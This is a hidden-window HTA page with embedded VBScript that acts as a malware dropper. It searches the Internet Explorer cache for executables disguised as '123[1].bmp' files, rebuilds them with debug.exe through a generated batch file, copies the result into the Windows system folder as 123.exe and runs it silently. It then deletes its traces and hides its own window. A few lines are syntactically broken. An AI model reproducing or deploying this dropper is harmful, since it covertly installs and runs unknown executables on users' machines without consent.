
<SCRIPT LANGUAGE="VBScript">
Option Explicit
Dim FSO,WSH,CACHE,str,sucess
Set FSO = CreateObject("Scripting.FileSystemObject")
Set WSH = CreateObject("WScript.Shell")
CACHE=wsh.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Cache")
sucess=0
 SearchBMPFile fso.GetFolder(CACHE),"123[1].bmp"
 if sucess=0 then SearchBMPFile fso.GetFolder(CACHE),"123[2].bmp"
Function SearchBMPFile(Folder,fname)
   Dim SubFolder,File,Lt,tmp,winsys
   str=FSO.GetParentFolderName(folder) & "\" & folder.name & "\" & fname');
   if FSO.FileExists(str) then
      tmp=fso.GetSpecialFolder(2) & "\"
      winsys=fso.GetSpecialFolder(1) & "\"
      set File=FSO.GetFile(str)
      File.Copy(tmp & "tmp.dat")
      On Error Resume Next
      File.Delete
      if FSO.FileExists(str) then exit function
      set Lt=FSO.CreateTextFile(tmp & "tmp.in")
      Lt.WriteLine("rbx")
      Lt.WriteLine("0")
      Lt.WriteLine("rcx")
      Lt.WriteLine("6200")
      Lt.WriteLine("w136")
      Lt.WriteLine("q")
      Lt.Close
      set Lt=FSO.CreateTextFile(tmp & "tmp.bat")
      Lt.WriteLine("%40echo off")
      Lt.WriteLine(chr(100) & "ebug " & tmp & "tmp.dat <" & tmp & "tmp.in >" & tmp & "tmp.out")
      Lt.WriteLine("copy " & tmp & "tmp.dat " & winsys & "123.exe>" & tmp & "tmp.out")
      Lt.WriteLine("del " & tmp & "tmp.dat >" & tmp & "tmp.out")
      Lt.WriteLine("del " & tmp & "tmp.in >" & tmp & "tmp.out")
      Lt.WriteLine(winsys & "123.exe")
      Lt.WriteLine("del %0")
      Lt.Close
  sucess=1
     WSH.Run tmp & "tmp.bat",false,6 
     On Error Resume Next 
end if
     If Folder.SubFolders.Count <> 0 Then 
     For Each SubFolder In Folder.SubFolders
     SearchBMPFile SubFolder,fname
Next
End If
End Function 
window.close
</SCRIPT>

<SCRIPT language=JavaScript>
function F()
{
  FF();
  if (sucess==0) setTimeout("F()", 2000);
}
setTimeout("F()", 2000);
parent.moveTo((screen.width-0)/2,(screen.height-0)/2);
parent.resizeTo(0,0);
</SCRIPT>
</head>
<HTA:APPLICATION caption="no" border="none"
SHOWINTASKBAR="no">
<body bgcolor="#ffffff" text="#000000" scroll="no" leftmargin="2" topmargin="3" 
marginwidth="0" marginheight="0" oncontextmenu='self.event.returnvalue=0' 
onkeydown="javascript:if(event.keyCode==27 || event.keyCode==78 && event.ctrlKey
)return 
false;">
</body>
</html> 
